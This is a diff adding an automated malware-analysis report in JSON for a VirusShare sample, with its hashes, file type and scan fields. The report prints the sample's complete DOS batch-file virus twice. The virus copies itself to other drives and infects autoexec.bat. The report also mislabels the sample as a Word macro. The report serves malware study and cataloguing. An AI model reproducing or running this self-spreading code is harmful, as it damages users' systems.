@@ -1,0 +1,41 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "autoexec": "Runs when the Word document is opened"
+        },
+        "macro": "if %1virus==virus autoexec virus\nif exist %1virus.bat virus %2\nif not exist %1autoexec.bat virus %2\ncopy virus.bat %1|echo echo off>virus\necho cls>>virus\necho if exist %%1virus.bat virus b:\\ c:\\>>virus\ntype %1autoexec.bat>>virus\ncopy virus %1autoexec.bat|del virus|virus %2"
+    },
+    "filename": "VirusShare_45cfce57df57cfa88ae0b963c06f42da",
+    "filesize": 282,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "45cfce57df57cfa88ae0b963c06f42da",
+        "sha1": "e06bdca5efb695115fe98fa15f7811e6fe566332",
+        "sha256": "a2bdc0f1c0b17804fae8b3b284b452b4f8ec2c0d1a55dd90bab67c9d3ac9645f"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "if %1virus==virus autoexec virus",
+            "if exist %1virus.bat virus %2",
+            "if not exist %1autoexec.bat virus %2",
+            "copy virus.bat %1|echo echo off>virus",
+            "echo cls>>virus",
+            "echo if exist %%1virus.bat virus b:\\ c:\\>>virus",
+            "type %1autoexec.bat>>virus",
+            "copy virus %1autoexec.bat|del virus|virus %2"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.276487",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
